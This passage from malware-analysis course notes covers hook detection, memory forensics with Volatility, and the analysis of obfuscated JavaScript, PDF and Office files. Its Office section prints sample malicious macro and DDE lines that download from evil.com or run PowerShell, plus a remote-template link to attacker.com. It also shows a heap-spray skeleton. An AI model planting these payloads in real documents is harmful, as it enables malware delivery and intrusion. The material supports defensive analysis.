- Uses Model Specific Registers (MSRs)
- Modification via `wrmsr` instruction
- Kernel Patch Protection (PatchGuard) protects against this on 64-bit Windows

### 6.5 Detecting Injection and Hooking

| Detection Method | Description |
|------------------|-------------|
| **IAT inspection** | Compare IAT entries to known good values |
| **Inline hook detection** | Check function prologues for JMP instructions |
| **Memory page attributes** | Detect RWX (Read-Write-Execute) pages |
| **Process hollowing detection** | Compare on-disk image to memory image |
| **Thread enumeration** | Identify threads started by external code |
| **ETW (Event Tracing)** | Monitor injection-related API calls |

---

## 7. Using Memory Forensics for Malware Analysis

### 7.1 Why Memory Forensics?

> **Definition**: **Memory forensics** is the acquisition and analysis of a computer's volatile memory (RAM) to extract digital evidence, detect malware, and understand system state at capture time.

### 7.2 When to Perform Live Acquisition

```
┌─────────────────────────────────────────────────────────┐
│         LIVE ACQUISITION CONSIDERATIONS                  │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  CRITICAL SCENARIOS:                                     │
│                                                          │
│  1. LOSS OF DATA DURING SHUTDOWN                        │
│     ├── Pagefile configured to wipe at shutdown        │
│     ├── Evidence eliminator apps activated              │
│     └── Fileless malware only in RAM                   │
│                                                          │
│  2. ENCRYPTION                                           │
│     ├── Full Disk Encryption (FDE) active              │
│     ├── Encrypted volumes mounted                       │
│     └── Cached passwords/keys in memory                │
│                                                          │
│  3. VOLUME OF DATA                                       │
│     ├── Too much data to image everything              │
│     └── Need targeted volatile evidence                │
│                                                          │
│  4. INCIDENT RESPONSE                                    │
│     ├── Active attack in progress                       │
│     ├── Malware running only in memory                 │
│     └── Business continuity requirements               │
│                                                          │
│  5. SPECIAL SYSTEMS                                      │
│     ├── Kiosk/Internet café (boot from CD)            │
│     └── Systems with no persistent storage             │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### 7.3 Evidence Available in Volatile Memory

| Evidence Type | Description |
|---------------|-------------|
| **Running processes** | All active processes and their memory |
| **Network connections** | Open sockets, established connections |
| **Loaded DLLs** | All loaded libraries per process |
| **Unpacked malware** | Decrypted/decompressed payloads |
| **Registry hives** | In-memory registry data |
| **Encryption keys** | Keys for mounted encrypted volumes |
| **User credentials** | Cached passwords, tokens, hashes |
| **Browser data** | Including private/incognito mode |
| **Chat/communication** | Recent messages, social media |
| **Clipboard contents** | Recently copied data |
| **Command history** | Recent commands executed |

### 7.4 Memory Acquisition Tools

| Tool | Type | Description |
|------|------|-------------|
| **DumpIt** | Free | Simple one-click memory dumper |
| **WinPmem** | Free | Part of Rekall project |
| **FTK Imager** | Free | AccessData memory capture |
| **Belkasoft RAM Capturer** | Free | Portable memory acquisition |
| **Magnet RAM Capture** | Free | Simple memory capture tool |
| **Volatility Workbench** | Free | GUI for Volatility framework |

### 7.5 Memory Analysis with Volatility

> **Volatility** is the most widely used open-source memory forensics framework.

#### Basic Volatility Commands

```bash
# Identify memory profile (OS version)
volatility -f memory.dmp imageinfo

# List running processes
volatility -f memory.dmp --profile=Win10x64 pslist

# Process tree (parent-child relationships)
volatility -f memory.dmp --profile=Win10x64 pstree

# Hidden processes (rootkit detection)
volatility -f memory.dmp --profile=Win10x64 psscan

# Network connections
volatility -f memory.dmp --profile=Win10x64 netscan

# Loaded DLLs for specific process
volatility -f memory.dmp --profile=Win10x64 dlllist -p 1234

# Dump process memory
volatility -f memory.dmp --profile=Win10x64 procdump -p 1234 -D ./output

# Command line arguments
volatility -f memory.dmp --profile=Win10x64 cmdline

# Extract registry hives
volatility -f memory.dmp --profile=Win10x64 hivelist

# Detect code injection
volatility -f memory.dmp --profile=Win10x64 malfind
```

### 7.6 Memory Forensics Workflow

```
┌─────────────────────────────────────────────────────────┐
│           MEMORY FORENSICS WORKFLOW                      │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  1. ACQUISITION                                          │
│     ├── Use appropriate tool for OS/environment         │
│     ├── Document chain of custody                       │
│     └── Calculate hash of memory dump                   │
│                          ↓                               │
│  2. PROFILE IDENTIFICATION                               │
│     ├── Determine OS version                            │
│     ├── Select correct Volatility profile               │
│     └── Verify profile with imageinfo                   │
│                          ↓                               │
│  3. PROCESS ANALYSIS                                     │
│     ├── List all processes (pslist, pstree)            │
│     ├── Look for hidden processes (psscan)             │
│     ├── Check command lines (cmdline)                  │
│     └── Identify suspicious parent-child relations     │
│                          ↓                               │
│  4. NETWORK ANALYSIS                                     │
│     ├── List connections (netscan)                     │
│     ├── Identify C2 communications                     │
│     └── Document external IPs/domains                  │
│                          ↓                               │
│  5. CODE INJECTION DETECTION                            │
│     ├── Use malfind for injected code                  │
│     ├── Check for RWX memory regions                   │
│     └── Dump suspicious memory regions                 │
│                          ↓                               │
│  6. ARTIFACT EXTRACTION                                  │
│     ├── Dump malicious processes                       │
│     ├── Extract registry hives                         │
│     ├── Recover encryption keys                       │
│     └── Extract credentials if needed                  │
│                          ↓                               │
│  7. REPORTING                                            │
│     ├── Document all findings                          │
│     ├── Timeline of events                             │
│     └── IOCs and recommendations                       │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### 7.7 Detecting Malware with Memory Forensics

#### Key Indicators

| Indicator | Volatility Plugin | What to Look For |
|-----------|-------------------|------------------|
| Hidden processes | `psscan` vs `pslist` | Processes in psscan not in pslist |
| Injected code | `malfind` | RWX pages with shellcode |
| Suspicious DLLs | `dlllist`, `ldrmodules` | Unknown or malicious DLLs |
| Hooked functions | `apihooks` | Inline or IAT hooks |
| Network activity | `netscan` | Unexpected connections |
| Persistence | `autoruns` (plugin) | Registry autorun entries |

---

## 8. Advanced JavaScript De-obfuscation

> **Note**: For fundamental JavaScript analysis concepts, see [[_REMA_UNIT 3#3. De-obfuscating Malicious JavaScript|Unit 3: De-obfuscating Malicious JavaScript]]

### 8.1 Advanced Obfuscation Techniques

#### 8.1.1 Control Flow Flattening

```javascript
// Original code
function process(x) {
    x = x + 1;
    x = x * 2;
    return x;
}

// After Control Flow Flattening
function process(x) {
    var state = 0;
    while(true) {
        switch(state) {
            case 0: x = x + 1; state = 1; break;
            case 1: x = x * 2; state = 2; break;
            case 2: return x;
        }
    }
}
```

#### 8.1.2 Opaque Predicates

```javascript
// Conditions that always evaluate the same way
// but are difficult to analyze statically

var x = Math.random();
if (x * x >= 0) {  // Always true
    maliciousCode();
}

if ((x | 0) === x && x > 0 && x < 1) { // Always false for random
    decoyCode();
}
```

#### 8.1.3 String Array Rotation

```javascript
// Strings stored in array, accessed by index
// Array rotated at runtime

var _0x1a2b = ['log', 'Hello', 'World', 'console'];

// Rotation function
(function(_0x2d8f00, _0x1a2b1c) {
    var _0x3e4f = function(_0x1c5f) {
        while (--_0x1c5f) {
            _0x2d8f00.push(_0x2d8f00.shift());
        }
    };
    _0x3e4f(++_0x1a2b1c);
})(_0x1a2b, 0x6f);

// Usage: _0x1a2b[0] may not be 'log' anymore
```

### 8.2 Advanced De-obfuscation Tools

| Tool | Description | Use Case |
|------|-------------|----------|
| **JStillery** | Abstract Syntax Tree (AST) based deobfuscation | Complex obfuscation |
| **de4js** | Online deobfuscator | Quick analysis |
| **JS Beautifier** | Format and decode | Initial cleanup |
| **synchrony** | Deobfuscate obfuscator.io output | Specific packer |
| **Box.js** | Sandbox for analyzing JavaScript | Dynamic analysis |
| **JSimple** | Static analysis framework | Research |

### 8.3 Debugging Obfuscated JavaScript

#### Browser DevTools Approach

```
1. PRETTIFY CODE
   └── DevTools → Sources → {} (Pretty Print)

2. SET BREAKPOINTS
   └── On suspicious functions:
       - eval()
       - Function()
       - document.write()

3. TRACE EXECUTION
   └── Step through code
   └── Watch variable values
   └── Monitor network requests

4. CONSOLE EXPERIMENTATION
   └── Evaluate obfuscated expressions
   └── Call decoder functions manually
   └── Inspect object structures
```

#### Anti-Debugging Bypass

```javascript
// Common anti-debugging checks:

// 1. DevTools detection
if (window.outerWidth - window.innerWidth > 160) {
    // DevTools probably open - exit
}

// 2. Debugger statement
debugger;  // Pauses if DevTools open

// 3. Timing check
var start = Date.now();
debugger;
if (Date.now() - start > 100) {
    // Debugger paused - exit
}

// Bypass: Override these functions or step over carefully
```

---

## 9. Advanced PDF Document Analysis

> **Note**: For fundamental PDF analysis concepts, see [[_REMA_UNIT 3#4. Analyzing Suspicious PDF Files|Unit 3: Analyzing Suspicious PDF Files]]

### 9.1 Advanced PDF Exploits

#### JavaScript Heap Spray in PDF

```javascript
// Educational example of exploit technique
// Heap spray prepares memory for exploitation

var shellcode = unescape("%u9090%u9090...");
var nopsled = unescape("%u9090%u9090");

while (nopsled.length < 0x100000) {
    nopsled += nopsled;
}

var block = nopsled.substring(0, 0x100000 - shellcode.length);
block = block + shellcode;

var memory = new Array();
for (var i = 0; i < 200; i++) {
    memory[i] = block.substring(0, block.length);
}
```

### 9.2 PDF Stream Analysis

#### Extracting Compressed Streams

```bash
# Using pdf-parser to extract streams
pdf-parser.py -f malicious.pdf > streams.txt

# Decompress specific object
pdf-parser.py -o 5 -f -d decoded_stream.bin malicious.pdf

# View raw stream content
pdf-parser.py -o 5 -c malicious.pdf
```

#### Common Stream Filters

| Filter | Description |
|--------|-------------|
| `/FlateDecode` | zlib/deflate compression |
| `/ASCIIHexDecode` | Hex-encoded ASCII |
| `/ASCII85Decode` | Base85 encoding |
| `/LZWDecode` | LZW compression |
| `/RunLengthDecode` | Run-length encoding |
| `/DCTDecode` | JPEG compression |
| `/CCITTFaxDecode` | Fax compression |

### 9.3 Automated PDF Analysis

```bash
# Complete analysis with peepdf
peepdf -i malicious.pdf

# In interactive mode:
PPDF> info          # General information
PPDF> tree          # Object tree
PPDF> search js     # Find JavaScript
PPDF> object 5      # View object 5
PPDF> stream 5      # Decode stream 5
PPDF> js_analyse    # Analyze JavaScript
PPDF> sctest 5      # Test shellcode
```

---

## 10. Advanced Office Document Analysis

> **Note**: For fundamental Office document analysis, see [[_REMA_UNIT 3#5. Examining Malicious Microsoft Office Documents|Unit 3: Examining Malicious Office Documents]]

### 10.1 VBA Stomping

> **Definition**: **VBA Stomping** is a technique where attackers remove the VBA source code but keep the compiled P-code, making analysis harder.

**Detection**:
```bash
# Check for VBA stomping
pcodedmp.py malicious.doc

# Compare P-code to source code
olevba -a malicious.doc
```

### 10.2 Excel 4.0 Macro Analysis

#### XLM Macro Extraction

```bash
# Extract XLM macros
XLMMacroDeobfuscator -f malicious.xlsm

# Or use olevba with XLM support
olevba --show-pcode malicious.xlsm
```

#### Common XLM Malicious Patterns

```
=EXEC("powershell -ep bypass IEX(...)")
=CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"http://evil.com/mal.exe","C:\mal.exe",0,0)
=REGISTER("kernel32","VirtualAlloc","JJJJJ","VA",1,9)
```

### 10.3 DDE (Dynamic Data Exchange) Attacks

> **Definition**: **DDE** allows Office applications to request data from other applications. Attackers abuse this to execute commands.

**Example DDE Payload**:
```
{ DDEAUTO c:\\windows\\system32\\cmd.exe "/k powershell -ep bypass -c IEX(...)" }
```

**Detection**:
```bash
# Search for DDE in document
strings document.docx | grep -i dde
unzip document.docx && grep -r "DDE" word/
```

### 10.4 Template Injection

> **Definition**: Documents can load remote templates that contain malicious macros.

**Indicator in document.xml.rels**:
```xml
<Relationship Type="...attachedTemplate"
    Target="http://attacker.com/template.dotm"
    TargetMode="External"/>
```

### 10.5 OLE Object Analysis

```bash
# List OLE objects
oleobj malicious.doc

# Extract embedded files
oleobj -i malicious.doc

# Analyze OLE structure
oledump.py malicious.doc

# With specific stream
oledump.py -s 8 -d malicious.doc
```

---

## 11. Summary and Key Takeaways

### 11.1 Analysis Methodology Overview

```
┌─────────────────────────────────────────────────────────┐
│          IN-DEPTH MALWARE ANALYSIS WORKFLOW              │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  STATIC ANALYSIS                                         │
│  ├── Identify packing/obfuscation                       │
│  ├── Extract strings and indicators                     │
│  ├── Analyze file structure                             │
│  └── Document initial findings                          │
│                          ↓                               │
│  UNPACKING (If Needed)                                   │
│  ├── Identify packer                                    │
│  ├── Use automatic or manual unpacking                  │
│  ├── Dump and rebuild executable                        │
│  └── Verify unpacked sample                             │
│                          ↓                               │
│  DYNAMIC ANALYSIS                                        │
│  ├── Execute in sandbox                                 │
│  ├── Monitor behavior                                   │
│  ├── Capture network traffic                            │
│  └── Document API calls                                 │
│                          ↓                               │
│  CODE ANALYSIS                                           │
│  ├── Disassemble/decompile                             │
│  ├── Identify key functions                             │
│  ├── Understand algorithms                              │
│  └── Map capabilities                                   │
│                          ↓                               │
│  MEMORY FORENSICS (If Applicable)                       │
│  ├── Acquire memory dump                               │
│  ├── Analyze with Volatility                           │
│  ├── Extract artifacts                                 │
│  └── Detect injection/hooking                          │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### 11.2 Quick Reference Tables

#### Packing Detection Summary

| Indicator | Normal | Packed |
|-----------|--------|--------|
| **Entropy** | < 7.0 | ≥ 7.0 |
| **Section Names** | .text, .data | UPX, random |
| **Import Count** | Many | Very few |
| **Strings** | Many readable | Few/none |
| **Entry Point** | In .text | In last section |

#### Injection/Hooking Detection

| Technique | Detection Method |
|-----------|------------------|
| DLL Injection | Monitor LoadLibrary calls, check loaded modules |
| Code Injection | Look for RWX memory regions |
| IAT Hooking | Compare IAT to on-disk PE |
| Inline Hooking | Check function prologues for JMPs |
| Process Hollowing | Compare in-memory to on-disk image |

### 11.3 Essential Tools Summary

| Category | Tools |
|----------|-------|
| **Packer Detection** | Detect It Easy, PEiD, pestudio |
| **Unpacking** | x64dbg + Scylla, UPX, QuickUnpack |
| **Memory Forensics** | Volatility, DumpIt, WinPmem |
| **Document Analysis** | olevba, oletools, peepdf |
| **JavaScript** | de4js, JStillery, Browser DevTools |

---

## 12. References and Further Reading

### Documentation and Frameworks
- MITRE ATT&CK: https://attack.mitre.org/
- Volatility Documentation: https://volatility3.readthedocs.io/
- LOLBAS Project: https://lolbas-project.github.io/

### Tools
- Volatility Framework: https://github.com/volatilityfoundation/volatility3
- x64dbg: https://x64dbg.com/
- oletools: https://github.com/decalage2/oletools
- Scylla: https://github.com/NtQuery/Scylla

### Learning Resources
- Practical Malware Analysis (Book)
- SANS FOR610: Reverse Engineering Malware
- OpenSecurityTraining2: Malware Analysis

---

## Tags

#REMA #MalwareAnalysis #ReverseEngineering #Packing #Unpacking #MemoryForensics #CodeInjection #APIHooking #FilelessMalware #Unit4

---

> **Note**: This material is for educational purposes in the context of cybersecurity defense and malware analysis. Always conduct analysis in isolated environments and follow responsible disclosure practices.
